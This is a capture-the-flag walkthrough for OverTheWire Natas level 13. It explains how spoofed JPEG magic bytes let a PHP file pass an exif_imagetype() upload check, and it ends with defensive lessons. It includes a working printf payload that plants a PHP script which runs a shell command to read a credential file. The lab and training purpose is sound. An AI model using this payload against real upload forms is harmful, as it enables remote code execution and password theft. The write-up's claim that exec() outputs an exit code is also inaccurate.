# OverTheWire: Natas — Level 13 → Level 14

> **Vulnerability Type:** Magic Byte Spoofing / File Upload Bypass via `exif_imagetype()`                                           
> **Skills:** PHP source code review, binary file crafting with `printf`, browser DevTools (form manipulation)                            
> **Difficulty:** Medium                                                                  
> **Official Page:** [Natas Level 13](https://overthewire.org/wargames/natas/natas13.html)

---

## Access

- **URL:** `http://natas13.natas.labs.overthewire.org`
- **Username:** `natas13`
- **Password:** *obtain from previous level*

---

## Task

Find and exploit the file upload mechanism to execute a PHP script on the server and read the password for `natas14` from `/etc/natas_webpass/natas14`.

---

## Vulnerability

This level demonstrates **magic byte spoofing**, a technique used to bypass file type validation that relies on inspecting a file's binary header rather than its extension or MIME type. The developer used PHP's `exif_imagetype()` function to check that only image files can be uploaded. While this is a meaningful upgrade over extension-only checks, it is still bypassable: `exif_imagetype()` only reads the first few bytes of a file to identify the format. An attacker can prepend a valid image header to a PHP script, causing the function to accept the file as an image while the web server still executes the PHP code it contains. The root mistake is trusting a file's self-reported signature as a sufficient proof of its contents.

---

## Theory

### What are Magic Bytes?

Every binary file format begins with a fixed sequence of bytes called a **magic number** or **magic bytes**. These bytes identify the format to the operating system and to programs that need to read the file. They are embedded in the file itself — not in the filename or HTTP headers — and they exist before any actual content.

| File Format | Magic Bytes (Hex)         | ASCII Representation |
|-------------|---------------------------|----------------------|
| JPEG        | `FF D8 FF E0`             | (non-printable)      |
| PNG         | `89 50 4E 47 0D 0A 1A 0A` | `.PNG....`           |
| GIF         | `47 49 46 38`             | `GIF8`               |
| PDF         | `25 50 44 46`             | `%PDF`               |
| ZIP         | `50 4B 03 04`             | `PK..`               |

The `file` command on Linux uses magic bytes to determine file type — it does not trust file extensions at all.

### How `exif_imagetype()` Works

PHP's `exif_imagetype()` reads the first few bytes of a file and compares them against known image format signatures. It returns an integer constant (e.g., `IMAGETYPE_JPEG = 2`) if the header matches a known image format, or `false` if it does not.

```php
// Returns 2 (IMAGETYPE_JPEG) for a valid JPEG
// Returns false for anything it does not recognise
exif_imagetype($filename);
```

This function does **not** read or validate the rest of the file. Anything after the recognised header is completely ignored by `exif_imagetype()`. This is the property that makes the attack possible.

### Why `echo` Cannot Write Raw Bytes

This is a critical practical point. The shell `echo` command treats `\xFF` as a literal six-character string — a backslash, an `x`, and four hex digits. It does not interpret it as a binary byte with the value `0xFF`. The correct tool is `printf`, which does support escape sequences for arbitrary byte values:

```bash
# WRONG — writes the literal text \xFF\xD8\xFF\xE0, not bytes
echo "\xFF\xD8\xFF\xE0"

# CORRECT — writes the raw bytes 0xFF 0xD8 0xFF 0xE0
printf '\xFF\xD8\xFF\xE0'
```

### Comparison with Natas Level 12

| Feature                        | Natas 12                        | Natas 13                                 |
|--------------------------------|---------------------------------|------------------------------------------|
| Extension check                | Client-side only (HTML form)    | Client-side only (HTML form)             |
| Server-side type check         | None                            | `exif_imagetype()` on uploaded file      |
| Bypass method                  | Change extension in DevTools    | Prepend JPEG magic bytes + change extension |
| Difficulty                     | Easy                            | Medium                                   |

The extension manipulation step from Level 12 is still required here. The only new requirement is that the file must also begin with valid JPEG magic bytes.

### Tools Used

| Tool           | Purpose                                                          |
|----------------|------------------------------------------------------------------|
| `printf`       | Write raw binary bytes to a file from the command line           |
| `file`         | Verify that a file's magic bytes match a known format            |
| Browser DevTools | Inspect and modify the HTML form before submission             |
| `curl`         | Alternative to the browser for making HTTP requests              |

---

## Solution

### Step 1: View the Page Source

Navigate to `http://natas13.natas.labs.overthewire.org` and log in. Click **View Page Source** (or press `Ctrl+U`). Find the PHP source embedded in the page.

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";
    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }
    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
        $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong.";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        // moved to target path and made accessible
        move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path);
        echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
    }
}
?>
```

> **What to notice:** The server-side check on line `} else if (! exif_imagetype(...)) {` is new compared to Level 12. If `exif_imagetype()` returns `false`, the upload is rejected with "File is not an image." This runs on the server, so you cannot bypass it by editing the HTML. However, `exif_imagetype()` only checks the first bytes of the file — it has no knowledge of what follows the header.

---

### Step 2: Examine the HTML Upload Form

Still in the page source, find the HTML form:

```html
<form enctype="multipart/form-data" action="index.php" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
    <input type="hidden" name="filename" value="<random>.jpg" />
    Choose a JPEG to upload (max 1KB):<br/>
    <input type="file" name="uploadedfile" /><br />
    <input type="submit" value="Upload File" />
</form>
```

> **What to notice:** The hidden `filename` input controls the extension that the server uses when saving the file. It currently ends in `.jpg`. You will change this to `.php` before submitting, exactly as in Level 12. The server reads `$_POST["filename"]` to determine the extension of the saved file — if you change it to `.php`, the server saves your file with a `.php` extension and the web server will execute it.

---

### Step 3: Craft the PHP Script with a JPEG Header

On your local machine, open a terminal and run the following command. This writes the four raw JPEG magic bytes (`0xFF 0xD8 0xFF 0xE0`) immediately followed by your PHP payload into a file called `shell.php`.

```bash
printf '\xFF\xD8\xFF\xE0<?php echo exec("cat /etc/natas_webpass/natas14"); ?>' > shell.php
```

The terminal produces no output for this command. The file is created silently.

---

### Step 4: Verify the File Looks Like a JPEG

Run the `file` command to confirm the magic bytes were written correctly:

```bash
file shell.php
```

```
shell.php: JPEG image data
```

> **What to notice:** The `file` command reports this as a JPEG image, not a PHP script. This is exactly what `exif_imagetype()` will also conclude. The PHP code you appended after the header is invisible to both tools — they stop inspecting after identifying the format from the header.

You can also inspect the raw bytes to be certain:

```bash
xxd shell.php | head -1
```

```
00000000: ffd8 ffe0 3c3f 7068 7020 6563 686f 2065  ....<?php echo e
```

> **What to notice:** The first four bytes are `FF D8 FF E0` — the JPEG magic bytes. Immediately after (`3c 3f 70 68 70`) is the ASCII for `<?php`. The file is both a technically valid JPEG header and a PHP script simultaneously.

---

### Step 5: Modify the Form and Upload the File

1. Go back to the Natas 13 page in your browser.
2. Open DevTools (`F12` or right-click → Inspect).
3. Click the **Inspector** (Firefox) or **Elements** (Chrome) tab.
4. Find the hidden input with `name="filename"`. Its `value` attribute will be something like `a8f3kqzxlm.jpg`.
5. Double-click the value and change the extension from `.jpg` to `.php`. For example: `a8f3kqzxlm.php`.
6. Close DevTools.
7. Click **Choose File**, select `shell.php` from your local machine.
8. Click **Upload File**.

The page will respond with a message like:

```
The file upload/a8f3kqzxlm.php has been uploaded
```

> **What to notice:** The server accepted the upload because `exif_imagetype()` read the first four bytes (`FF D8 FF E0`) and identified them as a valid JPEG header — it never inspected the PHP code that follows. The file was saved with a `.php` extension because you changed the hidden form field.

---

### Step 6: Execute the Uploaded Script

Click the link in the success message, or navigate directly to the upload path shown. The URL will be in the format:

```
http://natas13.natas.labs.overthewire.org/upload/a8f3kqzxlm.php
```

The page will display a string of characters — this is the password for `natas14`, followed by the return value of `exec()` (which appends the exit code `0`).

> **What to notice:** The Apache web server sees a `.php` file and passes it to the PHP interpreter. The interpreter encounters the JPEG header bytes at the start, which are outside any PHP tags, and outputs them as raw binary data (invisible in the browser). It then reaches the `<?php ... ?>` block and executes it, calling `exec("cat /etc/natas_webpass/natas14")` and echoing the result.

---

## Password for Next Level

```
[redacted — obtain by completing the steps above]
```

---

## Key Takeaways

- `exif_imagetype()` is not a complete defence against malicious file uploads. It only verifies that a file begins with a recognised image header — it makes no guarantees about the file's actual contents or whether the file contains executable code after that header.
- Magic bytes are trivially forgeable. Any attacker who understands binary file formats can prepend a valid image header to any payload. Genuine server-side file upload security requires combining multiple controls: validating the MIME type, re-encoding the image through a library (which strips non-image data), restricting the upload directory from web-accessible execution, and never allowing uploaded files to determine their own extension.
- The `file` command and `exif_imagetype()` share the same fundamental trust model — both rely on self-reported file signatures. Never treat a file's self-declared type as proof of its actual content.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Using `echo "\xFF\xD8\xFF\xE0"` instead of `printf` | The literal string `\xFF\xD8\xFF\xE0` is written as ASCII text, not binary bytes. `exif_imagetype()` rejects the file. | Use `printf '\xFF\xD8\xFF\xE0...'` to write actual raw bytes. |
| Forgetting to change the hidden `filename` field in the form | The file is saved with a `.jpg` extension. Apache serves it as a static file and does not execute the PHP. | Edit the hidden `filename` input in DevTools before submitting, changing `.jpg` to `.php`. |
| Not verifying with `file` or `xxd` before uploading | You cannot be sure the bytes were written correctly and may waste time debugging a server-side rejection. | Always run `file shell.php` and check that it reports `JPEG image data` before uploading. |
| Clicking the upload link before the page finishes loading | The file may not yet be written to disk, resulting in a 404. | Wait for the "has been uploaded" confirmation message before navigating to the file. |
| Using `require` instead of `echo exec(...)` in the payload | `require` includes the file contents and outputs them, but the password file does not end in a newline and output may be garbled alongside JPEG binary data. | Use `echo exec("cat /etc/natas_webpass/natas14")` for a clean, isolated output. |
